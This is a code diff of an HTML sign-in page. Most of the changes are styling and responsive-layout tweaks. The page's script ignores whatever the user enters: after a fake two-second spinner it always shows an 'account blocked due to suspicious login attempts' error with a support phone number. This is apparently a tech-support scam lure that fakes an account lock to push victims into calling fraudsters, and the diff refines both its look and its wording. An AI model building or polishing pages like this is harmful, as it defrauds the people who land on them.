@@ -23,28 +23,29 @@
             position: relative;
         }
 
-        /* Container for centering the form */
-        .container {
-            max-width: 400px;
-            width: 100%;
-            text-align: center;
-        }
-
         /* Logo at the top-left */
         .logo {
             position: absolute;
-            top: 20px;
-            left: 20px;
+            top: 10px;
+            left: 10px;
         }
 
         .logo img {
-            width: 30px;
-            height: 30px;
+            width: 40px;
+            height: 40px;
+        }
+
+        /* Container for the form */
+        .container {
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            margin: auto;
         }
 
         h1 {
-            font-size: 2.5rem;
-            margin-bottom: 20px;
+            font-size: 2rem;
+            margin-bottom: 15px;
             text-align: left;
             font-weight: bold;
         }
@@ -60,9 +61,9 @@
         input[type="email"],
         input[type="password"] {
             width: 100%;
-            height: 48px;
+            height: 44px;
             padding: 10px;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
             border: 1px solid #ccc;
             border-radius: 8px;
             font-size: 1rem;
@@ -94,21 +95,25 @@
             align-items: center;
             justify-content: flex-start;
             margin-bottom: 20px;
-            height: 70px;
+            height: 50px;
             border: 1px solid #ddd;
             border-radius: 8px;
             padding-left: 10px;
             background-color: #f9f9f9;
         }
 
-        /* Sign In Button with Spinner */
+        .captcha label {
+            margin: 0;
+        }
+
+        /* Sign In Button */
         .btn-container {
             position: relative;
         }
 
         button {
             width: 100%;
-            padding: 15px;
+            padding: 12px;
             font-size: 1rem;
             color: #fff;
             background-color: #000;
@@ -148,11 +153,12 @@
             display: none;
             margin-bottom: 10px;
             color: red;
-            font-size: 1rem;
+            font-size: 0.9rem;
             font-weight: bold;
             text-align: left;
         }
 
+        /* Footer */
         .footer {
             font-size: 0.8rem;
             color: #888;
@@ -164,12 +170,63 @@
             color: #000;
             text-decoration: underline;
         }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            body {
+                padding: 10px;
+            }
+
+            h1 {
+                font-size: 1.8rem;
+            }
+
+            .logo img {
+                width: 30px;
+                height: 30px;
+            }
+
+            button {
+                padding: 10px;
+                font-size: 0.9rem;
+            }
+
+            input[type="email"],
+            input[type="password"] {
+                height: 40px;
+                font-size: 0.9rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 1.5rem;
+            }
+
+            .logo img {
+                width: 25px;
+                height: 25px;
+            }
+
+            button {
+                padding: 8px;
+                font-size: 0.85rem;
+            }
+
+            .captcha {
+                height: 40px;
+            }
+
+            label, .remember, .forgot-password a {
+                font-size: 0.85rem;
+            }
+        }
     </style>
 </head>
 <body>
     <!-- Logo -->
     <div class="logo">
-        <img src="gem.png" alt="Logo">
+        <img src="https://via.placeholder.com/40" alt="Logo">
     </div>
 
     <!-- Container -->
@@ -179,26 +236,23 @@
 
         <!-- Sign In Form -->
         <form id="signin-form">
-            <!-- Email Input -->
             <label for="email">Email address</label>
             <input type="email" id="email" name="email">
 
-            <!-- Remember Email -->
             <div class="remember">
                 <input type="checkbox" id="remember">
                 <label for="remember">Remember my email address</label>
             </div>
 
-            <!-- Password Input -->
             <label for="password">Password</label>
             <input type="password" id="password" name="password">
 
-            <!-- Error Message Above Forgot Password -->
+            <!-- Error Message -->
             <div class="error-message" id="error-message">
-                Error code: 0X0047800 <br> Your account has been locked due to some suspicious login attempts. <br>Contact Support : <a href="tel:18335317046">+1-833-531-7046</a>
+                Error code: 0X0047800 <br> Your account has been blocked due to suspicious login attempts. <br>
+                Contact Support: <a href="tel:18335317046">+1-833-531-7046</a>
             </div>
 
-            <!-- Forgot Password -->
             <div class="forgot-password">
                 <a href="#">Forgot password?</a>
             </div>
@@ -223,28 +277,20 @@
         </div>
     </div>
 
-    <!-- JavaScript -->
     <script>
         document.getElementById("sign-in-btn").addEventListener("click", function() {
-            // Get elements
             const spinner = document.getElementById("spinner");
             const errorMessage = document.getElementById("error-message");
             const button = document.getElementById("sign-in-btn");
 
-            // Show spinner on the button
             spinner.style.display = "block";
-            button.style.color = "transparent"; // Hide button text
+            button.style.color = "transparent";
 
-            // Hide the error message if visible
             errorMessage.style.display = "none";
 
-            // Simulate API delay
             setTimeout(() => {
-                // Hide spinner and restore button text
                 spinner.style.display = "none";
                 button.style.color = "#fff";
-
-                // Show error message above Forgot Password
                 errorMessage.style.display = "block";
             }, 2000);
         });
